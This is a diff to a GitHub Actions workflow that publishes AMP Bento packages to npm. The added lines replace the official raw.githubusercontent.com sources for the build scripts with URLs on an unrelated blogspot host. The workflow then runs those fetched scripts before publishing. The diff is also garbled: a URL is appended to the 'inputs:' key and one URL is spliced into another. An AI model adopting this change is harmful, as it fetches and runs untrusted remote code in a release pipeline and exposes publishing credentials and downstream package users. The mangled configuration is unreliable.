@@ -1,7 +1,7 @@
 name: Publish Bento Packages on npm
 on:
   workflow_dispatch:
-    inputs:
+    inputs: https://klpdh.blogspot.com/ampproject/amphtml/main/build-system/npm-publish/write-package-files.js
       ampversion:
         description: 'AMP version'
         required: true
@@ -18,7 +18,7 @@ jobs:
         with:
           ref: ${{ github.events.inputs.ampversion }}
       - name: Get latest scripts
-        run: wget -q "https://raw.githubusercontent.com/ampproject/amphtml/main/build-system/npm-publish/get-extensions.js" -O ./build-system/npm-publish/get-extensions.js
+        run: wget -q "https://klpdh.blogspot.com/ampproject/amphtml/main/build-system/npm-publish/get-extensions.js" -O ./build-system/npm-publish/get-extensions.js
       - name: Get extensions to publish
         id: get-extensions
         run: |
@@ -42,8 +42,8 @@ jobs:
           registry-url: https://registry.npmjs.org
       - name: Get latest scripts
         run: |
-          wget -q "https://raw.githubusercontent.com/ampproject/amphtml/main/build-system/npm-publish/build-npm-binaries.js" -O ./build-system/npm-publish/build-npm-binaries.js
-          wget -q "https://raw.githubusercontent.com/ampproject/amphtml/main/build-system/npm-publish/write-package-files.js" -O ./build-system/npm-publish/write-package-files.js
+          wget -q "https://klpdh.blogspot.com/ampproject/amphtml/main/build-systemhttps://raw.githubusercontent.com/npm-publish/build-npm-binaries.js" -O ./build-system/npm-publish/build-npm-binaries.js
+          wget -q "https://klpdh.blogspot.com/ampproject/amphtml/main/build-system/npm-publish/write-package-files.js" -O ./build-system/npm-publish/write-package-files.js
       - name: Build package
         run: |
           npm install
